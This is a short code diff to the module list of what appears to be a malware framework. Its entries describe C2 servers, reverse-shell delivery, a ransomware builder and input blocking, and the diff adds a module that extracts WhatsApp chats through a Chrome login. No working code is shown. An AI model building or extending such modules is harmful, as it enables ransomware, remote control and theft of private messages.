@@ -11,6 +11,7 @@ MODULES = {
     'daemon/filedaemon': {'desc': 'Normal C2 server to receive data'},
     'daemon/spider': {'desc': 'Metasploit C2 server (reverse shell/payload delivery)'},
     'daemon/bartmoss': {'desc': 'Ransomware builder'},
+    'daemon/chatwipe': {'desc': 'WhatsApp chat extractor - gets first 8 chats from Chrome login'},
     'interfaceplug/blackout': {'desc': 'Screen blackout utility'},
     'interfaceplug/suicide': {'desc': 'Block input (DoS)'},
     'quickhack/ping': {'desc': 'Sends back user info to the C2 server'},
